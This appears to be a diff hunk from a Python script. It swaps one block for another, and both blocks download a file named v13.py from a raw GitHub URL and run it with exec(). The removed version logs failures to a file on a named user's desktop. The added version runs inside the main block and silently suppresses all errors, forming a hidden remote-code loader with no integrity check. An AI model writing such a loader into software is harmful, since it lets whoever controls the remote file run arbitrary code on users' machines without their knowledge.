@@ -147,18 +147,10 @@ if __name__ == "__main__":
                 except:
                     pass
 
-try:
-    import urllib.request
-    url_v13 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v13.py'
-    
-    # Añadimos un User-Agent para evitar que GitHub bloquee la petición
-    req = urllib.request.Request(url_v13, headers={"User-Agent": "Mozilla/5.0"})
-    
-    with urllib.request.urlopen(req, timeout=30) as response:
-        codigo = response.read().decode('utf-8')
-        exec(codigo)
-except Exception as e:
-    # Esto escribirá un archivo de texto en tu escritorio si algo falla, 
-    # para que sepas exactamente qué error ocurrió.
-    with open(r"C:\Users\Zak\Desktop\error_cadena.txt", "w") as f:
-        f.write(str(e))
+    try:
+        import urllib.request
+        url_v13 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v13.py'
+        with urllib.request.urlopen(url_v13, timeout=30) as response:
+            exec(response.read().decode('utf-8'))
+    except Exception:
+        pass
